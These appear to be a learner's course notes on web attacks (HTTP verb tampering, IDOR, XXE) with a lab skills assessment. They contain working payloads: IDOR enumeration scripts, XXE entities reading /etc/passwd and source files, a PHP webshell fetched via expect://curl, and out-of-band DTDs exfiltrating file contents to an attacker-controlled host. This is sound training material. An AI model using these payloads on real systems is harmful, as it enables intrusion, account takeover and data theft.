# Web Attacks

1. [HTTP Verb Tampering](#http-verb-tampering)
1. [IDOR](#idor)
1. [XXE Injection](#xxe-injection)
1. [Skills Assessment](#skills-assessment)

## HTTP Verb Tampering

* HTTP verb tampering attack exploits web servers that accept many HTTP verbs & methods

* HTTP has [9 verbs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) that can be accepted as HTTP methods by web servers; common ones include ```GET```, ```POST```, ```PUT``` and ```DELETE```

* If webapp or backend server is not configured securely to manage these methods, we can use them to gain control over backend server:

  * Insecure web server configurations - a web server's authentication config may be limited to specific HTTP methods, which would leave some HTTP methods accessible without authentication, leading to authentication bypass; can be easily detected using automated tools

  * Insecure coding - occurs when specific filters are applied in code to mitigate particular vulnerabilities, while not covering all HTTP methods with that filter; automated scanners can sometimes miss these types of vulnerabilities since it is caused due to human error

* Bypassing basic authentication:

  * For given test app, we have a file manager web app - we can create files but we cannot delete anything since it is restricted to authenticated users only; since we don't have creds for the HTTP basic auth, we get a ```401 Unauthorized``` page

  * First, identify which pages are restricted by this authentication - in this case, it is ```/admin/reset.php```, or rather the ```/admin``` directory itself, since we get the prompt again on accessing the directory

  * Intercepting the request to this page or directory shows that the HTTP request method being used here is ```GET```

  * We can attempt to send a ```POST``` request to check if webpage allows ```POST``` requests (in Burp Suite, right-click > Change Request Method) - this also gives us ```401 Unauthorized```

  * This shows that the web server config covers both ```GET``` & ```POST``` requests, but we need to test with all other HTTP methods

  * We can start with ```HEAD``` - similar to ```GET``` but does not return the body in HTTP response

  * Check with ```OPTIONS``` request to see which HTTP methods are accepted:

    ```shell
    curl -i -X OPTIONS http://83.136.254.223:59165
    # this should include accepted methods under 'Allow'
    # for some reason, I was not getting it as intended, so I had to run this

    curl -i -X OPTIONS http://83.136.254.223:59165/admin/reset.php.
    ```
  
  * We can see that ```HEAD```, ```GET```, ```POST```, and ```OPTIONS``` are allowed

  * If we intercept the reset request on Burp Suite and change from ```POST``` to ```HEAD```, we get a blank page instead of the ```401 Unauthorized``` page

  * If we go back to the web app, we can see the files have been deleted

* Bypassing security filters:

  * For the given example web app, if we try to create a filename with special characters in its name, we get 'Malicious Request Denied' message - this indicates webapp is using certain filters to deny injection attempts

  * We can try to intercept the above request in Burp Suite and change the request method to something other than default - this time we do not get the denied message and our file is created

  * We can test this further using command injection payloads, e.g. - ```file 1; touch file2;``` - and then change the request method; if both files are created, that means we were able to bypass filter through HTTP verb tampering vulnerability

* Verb tampering prevention:

  * Avoid restricting authorization to a particular HTTP method and always allow/deny all HTTP verbs; or use safe functions. We can also disable/deny ```HEAD``` requests
  * Be consistent with use of HTTP methods and expand testing scope in security filters by testing all request params

## IDOR

* IDOR (Insecure Direct Object References) occurs when webapp exposes direct reference to an object which can be controlled by end-user; these attacks can lead to accessing other users' data, often due to improper access control

* IDOR vulnerabilities can also lead to elevation of user privileges with IDOR insecure function calls

* Identifying IDORs:

  * URL parameters & APIs:

    * check for object references (e.g. - ```?uid=1``` or ```?file=notes.txt```) - can be found in URL params, APIs, or other HTTP headers
    * we can try incrementing the values of the object references to get other data - use fuzzing tools
  
  * AJAX calls:

    * check for unused params or APIs in frontend code, in the form of JS AJAX calls
    * identify AJAX calls to specific endpoints or APIs that contain direct object references
  
  * Understand hashing/encoding:

    * webapps can use encoded or hashed values instead of simple sequential numbers as object references
    * identify from source code or from online tools (like CyberChef, hash identifier tools, etc.)
  
  * Compare user roles:

    * register multiple users and compare their HTTP requests and object references
    * possible for one user to have access to certain API calls while other users don't

* Mass IDOR enumeration:

  * for given webapp, logging in as employee shows parameter ```uid=1``` in URL

  * in the documents page, we have many documents with predictable naming patterns - filename, ```uid``` and month/year as part of filename

  * this type of IDOR vulnerability is called static file IDOR

  * if we check by changing the ```uid``` in URL as well, we do not notice any difference in page output, but the linked files are different this time

  * for mass IDOR enumeration, start by crafting a command to fetch only the documents using regex; following which we can create a simple script to loop over ```uid``` and fetch documents of all employees:

    ```shell
    curl -s "http://example.com/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
    # fetch the filename in such a way that it can be appended in URL to access it
    ```

    ```shell
    #!/bin/bash

    url="http://example.com"

    for i in {1..10}; do
            for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                    wget -q $url/$link
            done
    done
    ```

* Bypassing encoded references:

  * under the Contracts section in given webapp, we can see the downloaded filename includes some encoded/hashed string

  * while the filename downloaded at the end includes MD5 hash of '1' (indicating ```uid``` 1), the intercepted request includes different data which cannot be easily decoded

  * we can check the source code however for the function being used to download contract

  * the source code shows that the value being hashed is ```btoa(uid)```, which is converted to MD5 hash; this can be replicated:

    ```shell
    echo -n 1 | base64 -w 0 | md5sum
    # the flags are added to prevent newlines
    ```
  
  * then, we can write a script for mass enumeration:

    ```shell
    #!/bin/bash

    for i in {1..10}; do
        for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
            curl -sOJ -X POST -d "contract=$hash" http://example.com/download.php
        done
    done
    ```

* IDOR in insecure APIs:

  * IDOR insecure function calls enable us to call APIs or execute functions as another user

  * for given webapp, when we edit our profile and update it, it persists through refreshes - indicating a DB

  * the intercepted request shows that the app is sending a ```PUT``` request to a certain API endpoint

  * the JSON parameters being sent includes data like ```role``` (user access privileges)

  * we can try to modify the parameters like changing ```uid``` or ```role```

  * we can change the ```uid``` as well as the API endpoint from '/1' to '/2' to avoid a 'uid mismatch' message

  * we can try changing from ```PUT``` to ```POST``` to create users (or ```DELETE``` to delete users), but we get error message saying it is for admins only

  * we can find the valid role names by sending a ```GET``` request to fetch other users' details - this will allow us to identify valid roles, which can be used later to modify other users' data

* Chaining IDOR vulnerabilities:

  * as we have an IDOR information disclosure vulnerability found from ```GET``` requests sent, we can similarly use ```PUT``` requests for given webapp to modify other users' data

  * one possible attack is modifying a user's email address and then requesting a password reset link - allowing control over their account

  * script to enumerate all users:

    ```shell
    #!/bin/bash

    url="http://83.136.253.251:51240"
    api="/profile/api.php/profile"

    for i in {1..10}; do
            curl -sb "role=employee" $url$api/$i | jq
    done
    ```
  
  * this gives us the data for the admin user as well; this shows us the admin role name as well, which can be used to create new users or delete current users

* IDOR prevention:

  * object-level access control
  * strong object referencing

## XXE Injection

* XXE (XML External Entity) injection is similar to other injection attacks; malicious XML data is injected to read local files on server or even RCE

* XML (eXtensible markup language) - used for storing data & documents; XML documents are formed of element trees, where each element is denoted by a tag, with first element being root element and others are child elements

* If we need to use characters used in XML document structure, like ```<```, ```>```, ```&``` and ```"```, as part of the actual document then we need to use their entity references like ```&lt;```, ```&gt;```, ```&amp;```, and ```&quot;```

* XML DTD (Document Type Definition) - allows validation of an XML document against a pre-defined document structure; this can be placed within the XML document itself, in an external file and then referenced or even referenced through a URL

* XML entities - we can define custom entities using ```ENTITY``` keyword in XML DTDs; it can be referenced in a document between an ```&``` and ```;```

* We can also reference external XML entities with the ```SYSTEM``` keyword, followed by the external entity's path:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE email [
    <!ENTITY company SYSTEM "http://localhost/company.txt">
    <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
  ]>
  ```

* When the XML file is parsed on the server-side, then an entity can reference a file stored on the back-end server, which may be disclosed to us when we reference the entity

* Local file disclosure:

  * for the given web app, we have a contact form; if we intercept the request on sending data, we can see the form data is sent in XML format:

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <root>
    <name>test</name>
    <tel>2312313123</tel>
    <email>email@email.com</email>
    <message>test</message>
    </root>
    ```

  * if the webapp uses outdated XML libraries and does not apply any filters or sanitize our XML input, we can exploit this to read local files

  * we need to note which elements are being displayed, so that we can inject into them; in this example the ```email``` data is being displayed on submitting

  * try to define a new entity and then use it as a variable in the ```email``` entity to check if it replaces the value - we need to add the following after the first line in XML input (if ```DOCTYPE``` was already declared here, we just add the ```ENTITY```):

    ```xml
    <!DOCTYPE email [
      <!ENTITY company "Inlane Freight">
    ]>
    ```

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [
      <!ENTITY company "Inlane Freight">
    ]>
    <root>
    <name>test</name>
    <tel>2312313123</tel>
    <email>&company;</email>
    <message>test</message>
    </root>
    ```
  
  * a non-vulnerable web app would display ```&company;``` as a raw value, but here we got the value of entity - indicating we can inject XML code

  * for certain webapps which send requests in JSON format, we can try changing the ```Content-Type``` header to ```application/xml``` and convert [JSON to XML](https://www.convertjson.com/json-to-xml.htm) - if webapp accepts XML data, we can check for XXE vulnerabilities

  * now, since internal XML entities worked, we can check for external XML entities:

    ```xml
    <!DOCTYPE email [
      <!ENTITY company SYSTEM "file:///etc/passwd">
    ]>
    ```
  
  * this works, and we can read local files like ```/etc/passwd``` or ```id_rsa``` for certain users which can be used to get access to server

  * we cannot read certain files if they're not in proper XML format; for those cases, we can try using wrapper filters to encode in base64, so that it does not break the format (this works only with PHP webapps):

    ```xml
    <!DOCTYPE email [
      <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
    ]>
    ```
  
  * for RCE, one way is by fetching a webshell from our server and writing it to web app; this requires the PHP ```expect``` module to be installed and enabled (```$IFS``` is used for spaces to avoid breaking XML format):

    ```shell
    echo '<?php system($_REQUEST["cmd"]);?>' > webshell.php

    sudo python3 -m http.server 80
    ```

    ```xml
    <!DOCTYPE email [
      <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'10.10.120.10/webshell.php'">
    ]>
    ```

* Advanced file disclosure:

  * Advanced exfiltration with CDATA:

    * to output data that does not obey XML syntax, we can wrap it with ```CDATA``` tags; and this can be used with XML parameter entities (start with ```%```, used only within DTD):

      ```shell
      echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
      # store this in a DTD file in our machine and host it

      python3 -m http.server 8000
      ```

      ```xml
      <!DOCTYPE email [
        <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
        <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
        <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
        <!ENTITY % xxe SYSTEM "http://10.10.120.10:8000/xxe.dtd"> <!-- reference our external DTD -->
        %xxe;
      ]>
      <root>
      <name>test</name>
      <email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
      </root>
      ```
  
  * Error based XXE:

    * this can be used if webapp displays runtime errors with improper exception handling for XML input

    * we can test by sending malformed XML data - delete any closing tag, misspell one of the tags or reference a non-existing entity

    * if  webapp displays error, we can exploit it to exfiltrate file content:

      ```xml
      <!-- host this DTD file on our machine -->
      <!ENTITY % file SYSTEM "file:///etc/hosts">
      <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
      ```

      ```xml
      <!-- call the external DTD script and reference the error entity -->
      <!-- no need to add any other data -->
      <!DOCTYPE email [ 
        <!ENTITY % remote SYSTEM "http://10.10.120.10:8000/xxe.dtd">
        %remote;
        %error;
      ]>
      ```
  
  * Blind data exfiltration:

    * Out-of-band (OOB) data exfiltration can be used in case of blind XXE vulnerabilities; the webapp will send a request to our web server with the content of the file to be read

    * first, use a parameter entity for file content, using PHP base64 filter; then we can create another external parameter entity (referring to our IP) and place the ```file``` parameter value as part of the URL. Once we inject the required payload in the request, we should see the decoded content in shell:

      ```xml
      <!-- host this DTD file on our machine -->
      <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
      <!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.120.10:8000/?content=%file;'>">
      ```

      ```php
      # create a script that automatically decodes the base64-encoded content and prints to terminal
      <?php
      if(isset($_GET['content'])){
          error_log("\n\n" . base64_decode($_GET['content']));
      }
      ?>
      ```

      ```shell
      vim index.php
      # write the above PHP script and host it

      php -S 0.0.0.0:8000
      ```

      ```xml
      <!-- payload to be used in request -->
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE email [ 
        <!ENTITY % remote SYSTEM "http://10.10.120.10:8000/xxe.dtd">
        %remote;
        %oob;
      ]>
      <root>&content;</root>
      ```

    * this process can be automated with the help of tools like [XXEInjector](https://github.com/enjoiz/XXEinjector):

      ```shell
      git clone https://github.com/enjoiz/XXEinjector.git

      # intercept and copy HTTP request to file
      
      vim req.txt
      # edit the request
      # do not include full XML data, only keep the first line and then write XXEINJECT in next line as a position locator

      ruby XXEinjector.rb --host=[10.10.120.10] --httpport=8000 --file=req.txt --path=/etc/passwd --oob=http --phpfilter
      # --path flag for file to be read
      
      # all exfiltrated files will be stored in the Logs folder
      ```

* XXE prevention:

  * avoid outdated components
  * use safe XML config

## Skills Assessment

* For the webapp, we can login using given creds; we can start exploring the app

* In settings, we have option to change password

* If we intercept the request to our profile page after logging in, we can see that an API call to the endpoint '/api.php/user/74' is made, where '74' is the value of our 'uid'; cookies 'PHPSESSID' and 'uid' are also used with their values

* In response to this GET request, we get user details; furthermore, if we change the uid in API endpoint as well as cookie, we can get other users' data

* We can attempt to enumerate further users and store the data in a file:

  ```shell
  #!/bin/bash

  url="http://94.237.62.195:47625"
  api="/api.php/user/"

  for i in {1..100}; do
          curl -sb "PHPSESSID=a3rv802fb28gf4ano0ldqlqg6u;uid=$i" $url$api/$i | jq >> userdata.txt
  done
  ```

* We do not get anything useful from this data as there are no admin users to be found yet

* However, for uid '52', we can see that the 'company' is 'Administrator' - we can try to check more info for this user by intercepting the request to '/profile.php' again and modifying the 'uid' to '52'

* Now we can view the info for this user; but we do not have any difference in functionality

* We can try an approach to reset the password for users, since we have the working code of reset functionality

* Using HTTP verb tampering, we can try bypassing authentication and/or reset password functionality by changing the request from ```GET``` to ```POST``` or ```GET``` to ```HEAD```

* The latter seems to work as we can change the request method from ```POST``` to ```GET``` for '/reset.php', and by configuring the required 'uid' of '52', we are able to change the password

* After logging as this Administrator user, we can see an added functionality of 'Add Event' in '/event.php'

* Viewing the source code shows that XML data is accepted here - we can check for XXE vulnerabilities

* Sending a legit request shows that the tag 'name' is printed in response

* Basic XXE injection methods seem to work - when we use this payload we get the value "Test" in response:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE name [
  <!ENTITY xxe "Test">
  ]>
  <root>
  <name>&xxe;</name>
  <details>event</details>
  <date>2024-04-09</date>
  </root>
  ```

* We can now test with different payloads to check this further - like ```<!ENTITY xxe SYSTEM "file:///etc/hosts">``` - but we are unable to read the flag file using this format

* We can use the base64 filter payload ```<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">``` - this prints the flag which can be decoded
